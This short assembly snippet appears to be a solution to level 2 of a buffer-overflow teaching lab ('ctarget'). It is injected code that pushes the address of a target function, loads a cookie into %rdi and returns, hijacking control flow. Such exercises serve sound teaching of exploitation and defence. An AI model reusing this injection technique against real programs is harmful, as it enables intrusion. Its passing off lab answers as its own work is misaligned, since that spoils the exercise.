#exploit code for ctarget level 2	
	pushq $0x4017ec  # push the addr of touch2
	movq $0x59b997fa, %rdi   # pass cookie as argument
	ret   # return to the pushed return address
